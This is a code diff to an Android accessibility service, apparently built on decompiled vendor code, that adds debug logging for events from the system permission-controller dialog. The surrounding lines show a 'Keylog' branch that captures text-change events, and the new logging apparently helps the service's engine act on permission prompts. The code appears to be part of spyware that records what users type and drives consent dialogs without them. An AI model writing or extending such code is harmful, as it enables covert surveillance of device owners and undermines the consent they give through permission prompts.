@@ -486,12 +486,16 @@ public class MyAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
 
-        // 调试: 记录事件类型和包名
+        // 调试: 记录所有事件（含 CONTENT_CHANGED），用于排查权限弹窗事件链路
         String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "null";
         int type = event.getEventType();
         if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             String cls = event.getClassName() != null ? event.getClassName().toString() : "null";
             Log.d(TAG, "EVENT: WINDOW_STATE_CHANGED pkg=" + pkg + " cls=" + cls);
+        } else if (pkg.contains("permission")) {
+            // 记录所有来自 permissioncontroller 的事件
+            Log.d(TAG, "EVENT: type=" + type + " pkg=" + pkg
+                + " cls=" + (event.getClassName() != null ? event.getClassName() : "null"));
         }
 
         // Keylog: TEXT_CHANGED 事件在锁之前处理，避免被丢弃
@@ -725,7 +729,17 @@ public class MyAccessibilityService extends AccessibilityService {
     // vendor: f0(event) — 引擎分发 (行 836-855)
     private void f0(AccessibilityEvent event) {
         try {
-            if (f229n.get() || W(event)) return;
+            boolean paused = f229n.get();
+            boolean filtered = W(event);
+            if (paused || filtered) {
+                // 诊断: 权限弹窗事件被过滤时记录原因
+                String eventPkg = event.getPackageName() != null ? event.getPackageName().toString() : "null";
+                if (eventPkg.contains("permission")) {
+                    Log.w(TAG, "f0() 权限事件被过滤: paused=" + paused + " W()=" + filtered
+                        + " pkg=" + eventPkg + " type=" + event.getEventType());
+                }
+                return;
+            }
             if (engineManager != null) {
                 String pkg = event.getPackageName() != null ? event.getPackageName().toString() : (String) f223u.get();
                 String cls = event.getClassName() != null ? event.getClassName().toString() : (String) f224v.get();
